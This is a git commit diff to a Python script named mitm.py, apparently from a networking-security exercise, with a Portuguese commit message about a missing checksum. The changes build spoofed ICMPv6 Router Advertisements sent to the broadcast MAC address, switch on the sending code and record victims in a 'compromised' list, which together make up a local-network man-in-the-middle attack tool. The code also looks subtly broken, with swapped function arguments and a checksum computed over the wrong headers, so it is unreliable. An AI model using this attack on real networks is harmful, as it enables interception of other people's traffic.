8330e182f25f34344c61566a32c1faf54a787eb1
pedro <pedrochem@hotmail.com>
2021-07-08 18:27:58 -0300

    falta o checksum

--- mitm.py
+++ mitm.py
@@ -20,7 +20,7 @@ def getmac():
 
   return mac[0:17]
 
-def calc_checksum(msg):
+def get_checksum(msg):
     s = 0
     # add padding if not multiple of 2 (16 bits)
     msg = (msg + b'\x00') if len(msg)%2 else msg
@@ -30,6 +30,28 @@ def calc_checksum(msg):
         s = (s & 0xffff) + (s >> 16)
     s = ~s & 0xffff
     return socket.ntohs(s)
+
+def calculate_icmpv6_checksum(packet):
+    """Calculate the ICMPv6 checksum for a packet.
+
+    :param packet: The packet bytes to checksum.
+    :returns: The checksum integer.
+    """
+    total = 0
+
+    # Add up 16-bit words
+    num_words = len(packet) // 2
+    for chunk in struct.unpack("!%sH" % num_words, packet[0:num_words * 2]):
+        total += chunk
+
+    # Add any left over byte
+    if len(packet) % 2:
+        total += packet[-1] << 8
+
+    # Fold 32-bits into 16-bits
+    total = (total >> 16) + (total & 0xffff)
+    total += total >> 16
+    return ~total + 0x10000 & 0xffff 
 
 def bytes_to_mac(bytesmac):
     return ":".join("{:02x}".format(x) for x in bytesmac)
@@ -44,14 +66,16 @@ def get_my_ipv6():
     addrs = netifaces.ifaddresses('eth0')
     return addrs[netifaces.AF_INET6][1]['addr'].split('%')[0]
 
-def create_eth_header(mac_dst):
+def create_eth(mac_dst):
+    mac_dst = bytes.fromhex('FFFFFFFFFFFF')
     mac2bytes = lambda m: bytes.fromhex(m.replace(':',''))
     mac_src = mac2bytes(getmac())
 
-    print("MAC DST:",bytes_to_mac(mac_dst))
-    print("MAC SRC:",bytes_to_mac(mac_src))
+    print("MAC DST:",mac_dst)
+    print("MAC SRC:",mac_src)
     print("Type:",hex(IPV6))
-    return struct.pack("!6s6sH", mac_dst,mac_src, IPV6)
+
+    return struct.pack("!6s6sH",(mac_dst),mac_src, IPV6)
 
 def is_compromised(sender_ip,next_header):
     if sender_ip in compromised:
@@ -68,48 +92,53 @@ def create_ipv6(sender_ip):
     payload_legth = 16
     next_header = socket.IPPROTO_ICMPV6
     hop_limit = 255
-    
-    print("SRC IP:",get_my_ipv6())
-    print("SRC DEST IP:",sender_ip)
-    
+        
     src_address = bytes.fromhex(str(get_my_ipv6()).replace(":",""))
     dst_address = bytes.fromhex(str(sender_ip).replace(":",""))
 
-    ver_traff =  version << 4
+    # src_address = bytes.fromhex('FE800000000000000000000000000000')
+    # dst_address = bytes.fromhex('FE80000000000000020000FFFEAA0003')
+
+  
+    print("SRC IP:",ipv6_to_bytes(get_my_ipv6()))
+    src_address = ipv6_to_bytes(get_my_ipv6())
+    print("SENDER IP:",ipv6_to_bytes(sender_ip))
+    dst_address = ipv6_to_bytes(sender_ip)
+    
+    ver_traff =  (version << 4) + 0
     traff_lab = 0
 
-    ip_pack = struct.pack('!BBHHBB32s32s', ver_traff, traff_lab, flow_label, payload_legth,next_header, hop_limit, src_address, dst_address)
-    for b in ip_pack:
-        print(hex(b),end=' ')
-    print()
+    ip_pack = struct.pack('!BBHHBB16s16s', ver_traff, traff_lab, flow_label, payload_legth,next_header, hop_limit, src_address, dst_address)
     return ip_pack
 
-def create_icmpv6():
+def create_icmpv6(eth,ipv6):
     adv_type = 134
     code = 0
     cur_hop_limit = 0
     router_lifetime = 0x0708
     reachable_time = bytes.fromhex('01010000')
     retrans_timer = bytes.fromhex('00aa0005')
-    checksum_in = 0
+    checksum = 0
     flags = 0x80
-    icmpv6_pack = struct.pack("!BBHBBH4s4s",adv_type,code,checksum_in,cur_hop_limit,flags,router_lifetime,reachable_time,retrans_timer)
-    checksum_fim = calc_checksum(icmpv6_pack)
-    # print("Checksum: ",checksum_fim)
-    icmpv6_pack = struct.pack("!BBHBBH4s4s",adv_type,code,checksum_fim,cur_hop_limit,flags,router_lifetime,reachable_time,retrans_timer)
+
+    icmpv6_pack = struct.pack("!BBHBBH4s4s",adv_type,code,checksum,cur_hop_limit,flags,router_lifetime,reachable_time,retrans_timer)
+    checksum = calculate_icmpv6_checksum(eth+ipv6+icmpv6_pack)
+    # print("Checksum: ",ipv6+checksum)
+    icmpv6_pack = struct.pack("!BBHBBH4s4s",adv_type,code,checksum,cur_hop_limit,flags,router_lifetime,reachable_time,retrans_timer)
+    
+    
     print("ICMPV6:",icmpv6_pack)
     return icmpv6_pack
 
 
 def send_icmpv6_advertisement(s, packet, mac_src, sender_ip):
+    ipv6 = create_ipv6(sender_ip)
+    eth = create_eth(mac_src)
+    icmpv6 = create_icmpv6(ipv6,eth)
     
-    icmpv6_header = create_icmpv6()
-    ipv6_header = create_ipv6(sender_ip)
-    eth_header = create_eth_header(mac_src)
-    
-    # pct = eth_header + ipv6_header + icmpv6_header
-    # s.send(pct)
-    # compromised.append(sender_ip)
+    pct = eth + ipv6 + icmpv6
+    s.send(pct)
+    compromised.append(sender_ip)
 
 def receive_ipv6(s, packet, mac_src): 
     first_word, payload_lenght, next_header, hoplimit = struct.unpack('>IHBB', packet[0:8])
